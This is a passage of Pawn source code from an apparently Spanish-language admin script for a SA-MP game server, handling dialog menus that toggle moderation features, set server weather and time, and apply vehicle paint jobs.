			if(listitem == 0)ShowPlayerDialog(playerid, lmenu+1, DIALOG_STYLE_LIST, "Habilitar", "{FF0000}*{FFFFFF} Anti Swear\n{FF0000}*{FFFFFF} Bad Name Kick\n{FF0000}*{FFFFFF} Anti Spam\n{FF0000}*{FFFFFF} Ping Kick\n{FF0000}*{FFFFFF} Read Cmds\n{FF0000}*{FFFFFF} Read PMs\n{FF0000}*{FFFFFF} Capital Letters\n{FF0000}*{FFFFFF} ConnectMessages\n{FF0000}*{FFFFFF} AdminCmdMessages\n{FF0000}*{FFFFFF} Auto Login", "Seleccionar", "Atras");
			if(listitem == 1)ShowPlayerDialog(playerid, lmenu+2, DIALOG_STYLE_LIST, "Deshabilitar", "{FF0000}*{FFFFFF} Anti Swear\n{FF0000}*{FFFFFF} Bad Name Kick\n{FF0000}*{FFFFFF} Anti Spam\n{FF0000}*{FFFFFF} Ping Kick\n{FF0000}*{FFFFFF} Read Cmds\n{FF0000}*{FFFFFF} Read PMs\n{FF0000}*{FFFFFF} Capital Letters\n{FF0000}*{FFFFFF} ConnectMessages\n{FF0000}*{FFFFFF} AdminCmdMessages\n{FF0000}*{FFFFFF} Auto Login", "Seleccionar", "Atras");
			if(listitem == 2)ShowPlayerDialog(playerid, lmenu+3, DIALOG_STYLE_LIST, "Server Clima", "{FF0000}*{FFFFFF} Clear Blue Sky\n{FF0000}*{FFFFFF} Sand Storm\n{FF0000}*{FFFFFF} Thunderstorm\n{FF0000}*{FFFFFF} Foggy\n{FF0000}*{FFFFFF} Cloudy\n{FF0000}*{FFFFFF} High Tide\n{FF0000}*{FFFFFF} Purple Sky\n{FF0000}*{FFFFFF} Black/White Sky\n{FF0000}*{FFFFFF} Dark, Green Sky\n{FF0000}*{FFFFFF} Heatwave", "Seleccionar", "Atras");
			if(listitem == 3)ShowPlayerDialog(playerid, lmenu+4, DIALOG_STYLE_LIST, "Server Hora", "{FF0000}*{FFFFFF} Morning\n{FF0000}*{FFFFFF} Mid day\n{FF0000}*{FFFFFF} Afternoon\n{FF0000}*{FFFFFF} Evening\n{FF0000}*{FFFFFF} Midnight", "Seleccionar", "Atras");
			if(listitem == 4)format(stringa,sizeof(stringa), "{FF0000}*{FFFFFF} Paint Job 1\n{FF0000}*{FFFFFF} Paint Job 2\n{FF0000}*{FFFFFF} Paint Job 3\n{FF0000}*{FFFFFF} Paint Job 4\n{FF0000}*{FFFFFF} Paint Job 5\n{FF0000}*{FFFFFF} Hydraulics\n{FF0000}*{FFFFFF} Wire Wheels\n{FF0000}*{FFFFFF} Twist Wheels\n{FF0000}*{FFFFFF} Access Wheels\n{FF0000}*{FFFFFF} Mega Wheels",stringa);
			if(listitem == 4)format(stringa, sizeof stringa, "%s\n{FF0000}*{FFFFFF} Import Wheels\n{FF0000}*{FFFFFF} Atomic Wheels\n{FF0000}*{FFFFFF} Offroad Wheels\n{FF0000}*{FFFFFF} Classic Wheels",stringa);
			if(listitem == 4)ShowPlayerDialog(playerid,lmenu+5,DIALOG_STYLE_LIST,"Tuning",stringa,"Seleccionar", "Atras");
		}
	}
	if(dialogid == lmenu+1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AntiSwear] = 1;
				dini_IntSet(file,"AntiSwear",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el antiswear.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[NameKick] = 1;
				dini_IntSet(file,"NameKick",1);
				format(string,sizeof(string),"{|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el namekick.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AntiSpam] = 1;
				dini_IntSet(file,"AntiSpam",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el antispam.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[MaxPing] = 1000;
				dini_IntSet(file,"MaxPing",1000);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el ping kick.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
			    new file[128];
				format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ReadCmds] = 1;
				dini_IntSet(file,"ReadCmds",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el reading commands.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 5)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ReadPMs] = 1;
				dini_IntSet(file,"ReadPMs",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el reading pms.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 6)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[NoCaps] = 0;
				dini_IntSet(file,"NoCaps",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el captial letters in chat.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 7)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ConnectMessages] = 1;
				dini_IntSet(file,"ConnectMessages",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el connect & disconnect messages.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 8)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AdminCmdMsg] = 1;
				dini_IntSet(file,"AdminCmdMessages",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el admin command messages.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 9)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AutoLogin] = 1;
				dini_IntSet(file,"AutoLogin",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el auto login.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
		}
		else ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == lmenu+2)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AntiSwear] = 0;
				dini_IntSet(file,"AntiSwear",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el antiswear.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[NameKick] = 0;
				dini_IntSet(file,"NameKick",0);
				format(string,sizeof(string),"{|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el namekick.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AntiSpam] = 0;
				dini_IntSet(file,"AntiSpam",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el antispam.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[MaxPing] = 0;
				dini_IntSet(file,"MaxPing",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el ping kick.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ReadCmds] = 0;
				dini_IntSet(file,"ReadCmds",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el reading commands.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 5)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ReadPMs] = 0;
				dini_IntSet(file,"ReadPMs",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el reading pms.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 6)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[NoCaps] = 1;
				dini_IntSet(file,"NoCaps",1);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el captial letters in chat.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 7)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[ConnectMessages] = 0;
				dini_IntSet(file,"ConnectMessages",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el connect & disconnect messages.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 8)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AdminCmdMsg] = 0;
				dini_IntSet(file,"AdminCmdMessages",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el admin command messages.",adminname);
				MessageToAdmins(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 9)
			{
			    new file[128];
			    format(file,sizeof(file),"ladmin/config/Config.ini");
				ServerInfo[AutoLogin] = 0;
				dini_IntSet(file,"AutoLogin",0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el auto login.",adminname);
				SendClientMessageToAll(red,string);
				SaveToFile("EnableLog",string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
		}
		else ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == lmenu+3)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SetWeather(5);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				SetWeather(19);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				SetWeather(8);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
			    SetWeather(20);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
			    SetWeather(9);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 5)
			{
			    SetWeather(8);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 6)
			{
			    SetWeather(16);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 7)
			{
			    SetWeather(45);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 8)
			{
			    SetWeather(44);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 9)
			{
			    SetWeather(22);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 10)
			{
			    SetWeather(11);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado el clima.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
		}
		else ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == lmenu+4)
	{
		if(response)
		{
			if(listitem == 0)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
				SetPlayerTime(i,7,0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado la hora.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
				SetPlayerTime(i,12,0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado la hora.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
				SetPlayerTime(i,16,0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado la hora.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
				SetPlayerTime(i,20,0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado la hora.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i))
				SetPlayerTime(i,0,0);
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha cambiado la hora.",adminname);
				SendClientMessageToAll(red,string);
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
			}
		}
		ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
	}
	if(dialogid == lmenu+5)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),0);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Capa de pintura 1 agregada.");
				ShowPlayerDialog(playerid, lmenu, DIALOG_STYLE_LIST, "lmenu", "{FF0000}*{FFFFFF} Habilitar\n{FF0000}*{FFFFFF} Deshabilitar\n{FF0000}*{FFFFFF} Server Clima\n{FF0000}*{FFFFFF} Server Hora\n{FF0000}*{FFFFFF} Tuning", "Seleccionar", "Salir");
                } else {
				SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estás en un vehiculo."); }
			}
			if(listitem == 1)
			{
			    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			    new LModel = GetVehicleModel(GetPlayerVehicleID(playerid));
			    switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				{ SendClientMessage(playerid,red,"|Error| »{EAEAEA} No puedes tunear este vehiculo."); } }
				ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),1);
				SendClientMessage(playerid,red,"|Tunear| »{EAEAEA} Capa de pintura 2 agregada.");
